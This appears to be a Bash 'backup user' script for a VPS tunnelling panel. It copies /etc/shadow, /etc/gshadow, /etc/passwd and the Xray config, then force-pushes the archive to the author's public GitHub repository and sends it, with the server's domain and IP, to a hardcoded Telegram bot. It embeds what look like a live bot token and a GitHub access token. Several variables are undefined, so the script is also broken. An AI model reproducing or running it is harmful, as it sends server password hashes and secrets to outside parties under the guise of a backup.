#!/bin/bash

#COLOR CODE
NC='\033[0m'
DEFBOLD='\e[39;1m'
RB='\e[31;1m'
GB='\e[32;1m'
YB='\e[33;1m'
BB='\033[0;36m'
MB='\e[0;1m'
CB='\e[35;1m'
WB='\e[37;1m'

# Info Token
TIMES="10"
CHATID="5439907118"
KEY="6079074982:AAG59dzsfG7nd8g7F_eLzdVab1_8nUfLCW8"
URL="https://api.telegram.org/bot$KEY/sendDocument"

# Info Domain
domain=$(cat /var/tmp/.domain) #Ganti directory Domain lu
IP=$(wget -qO- ipinfo.io/ip);
date=$(date +"%Y-%m-%d")
time=$(date +'%H:%M:%S')

# Backup User
clear
echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
echo -e "    ${WB}        ──── [ ʙᴀᴄᴋᴜᴘ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
echo -e "    ${BB}└───────────────────────────────────────┘${NC}" | lolcat
echo -e "$COLOR1│${NC}  [INFO] Create password for database"
read -rp "   [INFO] Enter password : " -e InputPass
sleep 1
if [[ -z $InputPass ]]; then
exit 0
fi
echo -e "$COLOR1│${NC}  [INFO] Processing... "
mkdir -p /root/backup
sleep 1

echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴛᴀʀᴛ ʙᴀᴄᴋᴜᴘ${NC}"

# Create Backup Folder
rm -rf /root/.backup
mkdir -p /root/.backup
mkdir -p /root/.backup/ssh
mkdir -p /root/.backup/xray

# Backup SSH
cp -r /etc/passwd /root/.backup/ssh/ &> /dev/null
cp -r /etc/group /root/.backup/ssh/ &> /dev/null
cp -r /etc/shadow /root/.backup/ssh/ &> /dev/null
cp -r /etc/gshadow /root/.backup/ssh/ &> /dev/null

# Backup Xray
cp -r /etc/xray/config.json /root/.backup/xray/ &> /dev/null

# Compress to zip
cd /root/.backup
zip -rP $InputPass $NameUser.zip backup > /dev/null 2>&1

LLatest=`date`
Get_Data () {
git clone https://github.com/tridebleng/backupuseryokko.git /root/user-backup/ &> /dev/null
}

Mkdir_Data () {
mkdir -p /root/user-backup/$NameUser
}

Input_Data_Append () {
if [ ! -f "/root/user-backup/$NameUser/$NameUser-last-backup" ]; then
touch /root/user-backup/$NameUser/$NameUser-last-backup
fi
echo -e "User         : $NameUser
last-backup : $LLatest
" >> /root/user-backup/$NameUser/$NameUser-last-backup
mv /root/$NameUser.zip /root/user-backup/$NameUser/
}

Save_And_Exit () {
    DATE=$(date +'%d %B %Y')
    cd /root/user-backup
    git config --global user.email "tridebleng@gmail.com" &> /dev/null
    git config --global user.name "tridebleng" &> /dev/null
    rm -rf .git &> /dev/null
    git init &> /dev/null
    git add . &> /dev/null
    git commit -m backup &> /dev/null
    git branch -M main &> /dev/null
    git remote add origin https://github.com/tridebleng/backupuseryokko
    git push -f https://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@github.com/tridebleng/backupuseryokko.git &> /dev/null
}

if [ ! -d "/root/user-backup/" ]; then
sleep 1
echo -e "  [INFO] Getting database... "
Get_Data
Mkdir_Data
sleep 1
echo -e "  [INFO] Getting info server... "
Input_Data_Append
sleep 1
echo -e "  [INFO] Processing updating server...... "
Save_And_Exit
fi
link="https://raw.githubusercontent.com/tridebleng/backupuseryokko/main/$NameUser/$NameUser.zip"
sleep 1


# Send To Google-Drive (WAJIB PUNYA SCRIPT UPLOAD GOOGLE DRIVE)
#id=$(gdrive upload $IP-backup.zip | grep Uploaded | awk '{print $2}')
#gdrive share $id > /dev/null 2>&1
#link="https://docs.google.com/uc?export=download&id=${id}"

# Send To Bot Notif
curl -F chat_id="$CHATID" -F document=@"$NameUser.zip" -F caption="ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴛʜɪꜱ ꜱᴄʀɪᴘᴛ
ᴅᴏᴍᴀɪɴ : $domain
ɪᴘ ᴠᴘꜱ : $IP
ᴅᴀᴛᴇ   : $date
ᴛɪᴍᴇ   : $time WIB
ʟɪɴᴋ ɢᴏᴏɢʟᴇ : $link" $URL &> /dev/null
echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴜᴄᴄᴇꜱꜱ ʙᴀᴄᴋᴜᴘ${NC}"
sleep 1

# Success Backup User
clear
cd
rm -rf /root/.backup
echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
echo -e "    ${WB}        ──── [ ʙᴀᴄᴋᴜp ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
echo -e "    ${BB}└───────────────────────────────────────┘${NC}" | lolcat
echo -e "     ɪᴘ ᴠᴘꜱ       : $IP"
echo -e "     ᴛᴀɴɢɢᴀʟ      : $date"
echo -e "     ʟɪɴᴋ ʙᴀᴄᴋᴜᴘ  : $link"
echo -e "    ${BB} ────────────────────────────────────────${NC}" | lolcat
echo -e "    ${GB}        ᴘʟᴇᴀꜱᴇ ꜱᴀᴠᴇ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ        ${NC}"
echo -e "    ${BB} ────────────────────────────────────────${NC}" | lolcat
echo -e ""
read -n 1 -s -r -p "     ᴘʀᴇꜱꜱ ᴀɴʏ ᴋᴇʏ ᴛᴏ ʙᴀᴄᴋ ᴏɴ ᴍᴇɴᴜ"
menu